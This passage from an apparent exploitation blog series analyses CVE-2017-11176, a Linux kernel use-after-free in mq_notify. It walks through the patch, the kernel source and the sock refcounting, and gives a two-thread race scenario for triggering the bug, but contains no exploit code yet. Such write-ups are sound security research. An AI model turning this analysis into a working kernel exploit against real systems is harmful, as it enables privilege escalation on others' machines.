<span class="gd">-     if (ret == 1)</span>
<span class="gi">+     if (ret == 1) {</span>
<span class="gi">+       sock = NULL;</span>
        goto retry;
<span class="gi">+     }</span>
      if (ret) {
        sock = NULL;
        nc = NULL;
</code></pre></div><p>That is a <em>one line patch</em>! Easy enough...</p><p>Finally, the patch description provides a lot of helpful information to understand the bug:</p><div class="highlight"><pre><span></span><code>mqueue: fix a use-after-free in sys_mq_notify()
The retry logic for netlink_attachskb() inside sys_mq_notify()
is nasty and vulnerable:

1) The sock refcnt is already released when retry is needed
2) The fd is controllable by user-space because we already
   release the file refcnt

so we then retry but the fd has been just closed by user-space
during this small window, we end up calling netlink_detachskb()
on the error path which releases the sock again, later when
the user-space closes this socket a use-after-free could be
triggered.

Setting 'sock' to NULL here should be sufficient to fix it
</code></pre></div><p>There is only <strong>a single mistake</strong> in the patch description: <em>during this small window</em>. Albeit the bug as a "racy" aspect, we will see that the window can actually be extended indefinitely in a deterministic way (cf. <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html">part 2</a>).</p><hr><h1 id="understanding-the-bug">Understanding the Bug</h1><p>The patch description above gives a lot of useful information:</p><ul><li>The vulnerable code lies in the syscall <strong>mq_notify</strong></li><li>There is something wrong with the <strong>retry logic</strong></li><li>There is something wrong with the <strong>sock variable refcounting</strong>, leading to a use-after-free</li><li>There is something related to a <strong>race condition</strong> with a <em>closed fd</em></li></ul><h2 id="the-vulnerable-code">The vulnerable code</h2><p>Let's dig into the <em>mq_notify()</em> syscall implementation, especially the <strong>retry logic</strong> part (i.e. <em>retry</em> label), as well as, the <strong>exit path</strong> (i.e. <em>out</em> label):</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="c1">// from [ipc/mqueue.c]</span>

<span class="w">      </span><span class="n">SYSCALL_DEFINE2</span><span class="p">(</span><span class="n">mq_notify</span><span class="p">,</span><span class="w"> </span><span class="n">mqd_t</span><span class="p">,</span><span class="w"> </span><span class="n">mqdes</span><span class="p">,</span><span class="w"></span>
<span class="w">          </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sigevent</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="n">u_notification</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">file</span><span class="w"> </span><span class="o">*</span><span class="n">filp</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">sigevent</span><span class="w"> </span><span class="n">notification</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">sk_buff</span><span class="w"> </span><span class="o">*</span><span class="n">nc</span><span class="p">;</span><span class="w"></span>

<span class="w">        </span><span class="c1">// ... cut (copy userland data to kernel + skb allocation) ...</span>

<span class="w">        </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="nl">retry</span><span class="p">:</span><span class="w"></span>
<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">       </span><span class="n">filp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fget</span><span class="p">(</span><span class="n">notification</span><span class="p">.</span><span class="n">sigev_signo</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">filp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">EBADF</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">         </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="p">}</span><span class="w"></span>
<span class="p">[</span><span class="mi">2</span><span class="n">a</span><span class="p">]</span><span class="w">      </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_getsockbyfilp</span><span class="p">(</span><span class="n">filp</span><span class="p">);</span><span class="w"></span>
<span class="p">[</span><span class="mi">2</span><span class="n">b</span><span class="p">]</span><span class="w">      </span><span class="n">fput</span><span class="p">(</span><span class="n">filp</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">IS_ERR</span><span class="p">(</span><span class="n">sock</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PTR_ERR</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w">         </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="p">}</span><span class="w"></span>

<span class="w">          </span><span class="n">timeo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MAX_SCHEDULE_TIMEOUT</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w">       </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_attachskb</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">nc</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">timeo</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ret</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"></span>
<span class="p">[</span><span class="mi">5</span><span class="n">a</span><span class="p">]</span><span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">retry</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ret</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="n">nc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">5</span><span class="n">b</span><span class="p">]</span><span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="p">}</span><span class="w"></span>

<span class="p">[</span><span class="mi">5</span><span class="n">c</span><span class="p">]</span><span class="w">    </span><span class="c1">// ... cut (normal path) ...</span>

<span class="w">      </span><span class="nl">out</span><span class="p">:</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sock</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="n">netlink_detachskb</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">nc</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">nc</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="n">dev_kfree_skb</span><span class="p">(</span><span class="n">nc</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>The previous code begins by taking a reference on a <em>struct file</em> object based on a user provided file descriptor [0]. If such fd does not exist in the current process <strong>file descriptor table (fdt)</strong>, a NULL pointer is returned and the code goes into the <em>exit path</em> [1].</p><p>Otherwise, a reference is taken on the <em>struct sock</em> object associated to that file [2a]. If there is no valid <em>struct sock</em> object associated (not existent or bad type), the pointer to <em>sock</em> is reset to NULL and the code goes into the exit path [3]. In both cases, the previous <em>struct file</em> reference is dropped [2b].</p><p>Finally, there is a call to <strong>netlink_attachskb()</strong> [4] which tries to enqueue a <em>struct sk_buff</em> (nc) to a <em>struct sock</em> receive queue. From there, there is three possible outcomes:</p><ol><li>Everything went fine, the code continues in the normal path [5c].</li><li>The function returns 1, in that case the code jumps back to the <strong>retry label</strong> [5a]. That is, the "retry logic".</li><li>Otherwise, both the <em>nc</em> and the <em>sock</em> are set to NULL, and the code jumps to the <em>exit path</em> [5b].</li></ol><h2 id="why-setting-sock-to-null-matters">Why setting "sock" to NULL matters?</h2><p>To answer this question, let's ask ourselves: what will happen if it is <em>not</em> NULL? The response is:</p><div class="highlight"><pre><span></span><code><span class="w">  </span><span class="nl">out</span><span class="p">:</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sock</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="n">netlink_detachskb</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">nc</span><span class="p">);</span><span class="w">  </span><span class="c1">// &lt;----- here</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span>
</code></pre></div><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="c1">// from [net/netlink/af_netlink.c]</span>

<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_detachskb</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sk_buff</span><span class="w"> </span><span class="o">*</span><span class="n">skb</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="n">kfree_skb</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="n">sock_put</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w">       </span><span class="c1">// &lt;----- here</span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="c1">// from [include/net/sock.h]</span>

<span class="w">    </span><span class="cm">/* Ungrab socket and destroy it if it was the last reference. */</span><span class="w"></span>
<span class="w">    </span><span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">sock_put</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">atomic_dec_and_test</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_refcnt</span><span class="p">))</span><span class="w">    </span><span class="c1">// &lt;----- here</span>
<span class="w">        </span><span class="n">sk_free</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>In other words, if <em>sock</em> is not <em>NULL</em> during the <em>exit path</em>, <strong>its reference counter (<em>sk_refcnt</em>) will be unconditionally decreased by 1</strong>.</p><p>As the patch stated, there is an issue with the refcounting on the <em>sock</em> object. But where is this refcounting initially incremented? If we look at the <strong>netlink_getsockbyfilp()</strong> code (called in [2a] in previous listing), we have:</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="c1">// from [net/netlink/af_netlink.c]</span>

<span class="w">    </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">netlink_getsockbyfilp</span><span class="p">(</span><span class="k">struct</span> <span class="nc">file</span><span class="w"> </span><span class="o">*</span><span class="n">filp</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">inode</span><span class="w"> </span><span class="o">*</span><span class="n">inode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">filp</span><span class="o">-&gt;</span><span class="n">f_path</span><span class="p">.</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_inode</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">S_ISSOCK</span><span class="p">(</span><span class="n">inode</span><span class="o">-&gt;</span><span class="n">i_mode</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ERR_PTR</span><span class="p">(</span><span class="o">-</span><span class="n">ENOTSOCK</span><span class="p">);</span><span class="w"></span>

<span class="w">      </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SOCKET_I</span><span class="p">(</span><span class="n">inode</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk_family</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">AF_NETLINK</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ERR_PTR</span><span class="p">(</span><span class="o">-</span><span class="n">EINVAL</span><span class="p">);</span><span class="w"></span>

<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">   </span><span class="n">sock_hold</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span><span class="w">    </span><span class="c1">// &lt;----- here</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">sock</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="c1">// from [include/net/sock.h]</span>

<span class="w">    </span><span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">sock_hold</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="n">atomic_inc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_refcnt</span><span class="p">);</span><span class="w">   </span><span class="c1">// &lt;------ here</span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>So, the <em>sock</em> object's refcounter is incremented [0] very early in the retry logic.</p><p>Since the counter is unconditionally incremented by <em>netlink_getsockbyfilp()</em>, and decremented by <em>netlink_detachskb()</em> (if <em>sock</em> is not NULL). It means that <em>netlink_attachskb()</em> should somehow be neutral regarding refcounter.</p><p>Here is a simplified version of the <em>netlink_attachskb()</em> code:</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="c1">// from [net/netlink/af_netlink.c]</span>

<span class="w">    </span><span class="cm">/*</span>
<span class="cm">     * Attach a skb to a netlink socket.</span>
<span class="cm">     * The caller must hold a reference to the destination socket. On error, the</span>
<span class="cm">     * reference is dropped. The skb is not sent to the destination, just all</span>
<span class="cm">     * all error checks are performed and memory in the queue is reserved.</span>
<span class="cm">     * Return values:</span>
<span class="cm">     * &lt; 0: error. skb freed, reference to sock dropped.</span>
<span class="cm">     * 0: continue</span>
<span class="cm">     * 1: repeat lookup - reference dropped while waiting for socket memory.</span>
<span class="cm">     */</span><span class="w"></span>

<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_attachskb</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sk_buff</span><span class="w"> </span><span class="o">*</span><span class="n">skb</span><span class="p">,</span><span class="w"></span>
<span class="w">              </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="n">timeo</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">ssk</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="o">*</span><span class="n">nlk</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="n">nlk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>

<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rmem_alloc</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rcvbuf</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">test_bit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>

<span class="w">        </span><span class="c1">// ... cut (wait until some conditions) ...</span>

<span class="w">        </span><span class="n">sock_put</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w">         </span><span class="c1">// &lt;----- refcnt decremented here</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">signal_pending</span><span class="p">(</span><span class="n">current</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="n">kfree_skb</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="n">sock_intr_errno</span><span class="p">(</span><span class="o">*</span><span class="n">timeo</span><span class="p">);</span><span class="w"> </span><span class="c1">// &lt;----- "error" path</span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">   </span><span class="c1">// &lt;----- "retry" path</span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="w">      </span><span class="n">skb_set_owner_r</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span><span class="w"> </span><span class="n">sk</span><span class="p">);</span><span class="w">   </span><span class="c1">// &lt;----- "normal" path</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>Function netlink_attachskb() has basically two paths:</p><ol><li>Normal path: the <em>skb</em> ownership is transferred to the <em>sock</em> (i.e. enqueued in the sock receive queue).</li><li>Socket's receive buffer is full: wait until there is enough room and retry or quit on error.</li></ol><p>As the top-commentary says: <em>The caller must hold a reference to the destination socket. On error, the <strong>reference is dropped</strong>.</em> Yes, <em>netlink_attachskb()</em> has a side-effect on sock refcounter!</p><p>Since, <em>netlink_attachskb()</em> may release a refcounter (only one was taken with <em>netlink_getsockbyfilp()</em>), it is the caller responsibility <strong>not to release it a second time</strong>. This is achieved by setting <em>sock</em> to NULL! This is properly done on the "error" path (netlink_attachskb() returns negative value), but not on the "retry" path (<em>netlink_attachskb()</em> returns 1) and this is what the patch is all about.</p><p>So far, we now know what is wrong with the <em>sock</em> variable refcounting (it is released a second time under certain conditions), as well as, the retry logic (it does not reset <em>sock</em> to NULL).</p><h2 id="what-about-the-race-condition">What about the "race condition"?</h2><p>The patch mentioned something about a "small window" (i.e. race condition) related to a "closed fd" stuff. Why?</p><p>Let's look again at the very beginning of the <em>retry path</em>:</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w">  </span><span class="c1">// &lt;----- first loop only</span>
<span class="w">    </span><span class="nl">retry</span><span class="p">:</span><span class="w"></span>
<span class="w">          </span><span class="n">filp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fget</span><span class="p">(</span><span class="n">notification</span><span class="p">.</span><span class="n">sigev_signo</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">filp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">EBADF</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w">         </span><span class="c1">// &lt;----- what about this?</span>
<span class="w">          </span><span class="p">}</span><span class="w"></span>
<span class="w">          </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_getsockbyfilp</span><span class="p">(</span><span class="n">filp</span><span class="p">);</span><span class="w"></span>
</code></pre></div><p>This <em>error handling</em> path might look innocent during the <em>first loop</em>. But, remember, during the <em>second loop</em> (i.e. after "goto retry"), <strong><em>sock</em> is not NULL anymore</strong> (and a ref has been already dropped). So, it directly jumps to "out", and hits the first condition...</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="nl">out</span><span class="p">:</span><span class="w"></span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sock</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">netlink_detachskb</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">nc</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>...<em>sock</em>'s refcounter is decremented a second time! <strong>This is a double <em>sock_put()</em> bug</strong>.</p><p>One might wonder why we would hit this condition (<em>fget()</em> returns NULL) during the second loop since it was not true during the first loop. This is the <strong>race condition</strong> aspect of that bug. We will see how to do it in the next section.</p><h2 id="attack-scenario">Attack Scenario</h2><p>Assuming a file descriptor table can be shared between two threads, consider the following sequence:</p><div class="highlight"><pre><span></span><code>Thread-1                            | Thread-2              | file refcnt | sock refcnt | sock ptr           |
------------------------------------+-----------------------+-------------+-------------+--------------------+
 mq_notify()                        |                       | 1           | 1           | NULL               |
                                    |                       |             |             |                    |
  fget(&lt;TARGET_FD&gt;) -&gt; ok           |                       | 2 (+1)      | 1           | NULL               |
                                    |                       |             |             |                    |
  netlink_getsockbyfilp() -&gt; ok     |                       | 2           | 2 (+1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fput(&lt;TARGET_FD&gt;) -&gt; ok           |                       | 1 (-1)      | 2           | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_attachskb() -&gt; returns 1  |                       | 1           | 1 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
                                    | close(&lt;TARGET_FD&gt;)    | 0 (-1)      | 0 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto retry                        |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fget(&lt;TARGET_FD) -&gt; returns NULL  |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto out                          |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_detachskb() -&gt; UAF!       |                       | FREE        | (-1) in UAF | 0xffffffc0aabbccdd |
</code></pre></div><p>The <strong>close(TARGET_FD)</strong> syscall invokes <em>fput()</em> (which decreases the reference counter of a <em>struct file</em> object by one) and removes the mapping from the given file descriptor (TARGET_FD) to the referenced file. That is, is the set <em>fdt[TARGET_FD]</em> entry to NULL. Since calling <strong>close(TARGET_FD)</strong> released the last reference of its associated <em>struct file</em>, it will be freed.</p><p>Since the <em>struct file</em> is freed, it drops the reference to its associated <em>struct sock</em> (i.e. refcounter will be decreased by one). Again, since the <em>sock</em> refcounter also hits zero, it is freed. At this time, the <em>sock</em> pointer is a <em>dangling pointer</em> which has not been reset to NULL.</p><p>The second call to <em>fget()</em> will fail (the fd does not point to any valid struct file in the FDT) and directly jump to "out" label. Then <em>netlink_detachskb()</em> will be called with a pointer to freed data, which causes a <strong>use-after-free</strong>!</p><p>Again, the use-after-free is the consequence, not the bug.</p><p>This is why the patch mentioned a "closed fd" thing. It is <strong>a necessary condition to actually trigger the bug</strong>. And because the <em>close()</em> happens at a very specific time in another thread, it is a "race".</p><p>So far, we've got everything needed to understand the bug and how to trigger it. We need to satisfy two conditions:</p><ol><li>On the first retry loop, a call to <em>netlink_attachskb()</em> should return 1.</li><li>On the second retry loop, the call to <em>fget()</em> should return <em>NULL</em>.</li></ol><p>In other words, when we return from the <em>mq_notify()</em> syscall, the <em>sock</em>'s refcounter has been decremented by one and we created an imbalance. Because the sock refcounter was set to one before entering <em>mq_notify()</em>, it is used after being freed by the end of the syscall (in <em>netlink_detachskb()</em>).</p><hr><h1 id="reaching-the-retry-logic">Reaching the Retry Logic</h1><p>In the previous section, we analyzed the bug and designed an attack scenario to trigger it. In this section, we will see how we can reach the vulnerable code (that is the retry label) and start coding the exploit.</p><p>In fact, before implementing anything, one must check that the bug is <em>a priori</em> exploitable. If we can't even reach the vulnerable code path (because of security checks) there is no reason to continue.</p><h2 id="analyzing-the-code-before-the-retry-label">Analyzing the code before the retry label</h2><p>Like most system calls, <em>mq_notify</em> starts by making a local copy of userland data using <strong>copy_from_user()</strong> function:</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="n">SYSCALL_DEFINE2</span><span class="p">(</span><span class="n">mq_notify</span><span class="p">,</span><span class="w"> </span><span class="n">mqd_t</span><span class="p">,</span><span class="w"> </span><span class="n">mqdes</span><span class="p">,</span><span class="w"></span>
<span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sigevent</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="n">u_notification</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">file</span><span class="w"> </span><span class="o">*</span><span class="n">filp</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">inode</span><span class="w"> </span><span class="o">*</span><span class="n">inode</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">sigevent</span><span class="w"> </span><span class="n">notification</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">mqueue_inode_info</span><span class="w"> </span><span class="o">*</span><span class="n">info</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">sk_buff</span><span class="w"> </span><span class="o">*</span><span class="n">nc</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">u_notification</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">notification</span><span class="p">,</span><span class="w"> </span><span class="n">u_notification</span><span class="p">,</span><span class="w"></span>
<span class="w">              </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sigevent</span><span class="p">)))</span><span class="w"></span>
<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>

<span class="w">      </span><span class="n">audit_mq_notify</span><span class="p">(</span><span class="n">mqdes</span><span class="p">,</span><span class="w"> </span><span class="n">u_notification</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="o">&amp;</span><span class="nl">notification</span> <span class="p">:</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w">  </span><span class="c1">// &lt;--- you can ignore this</span>
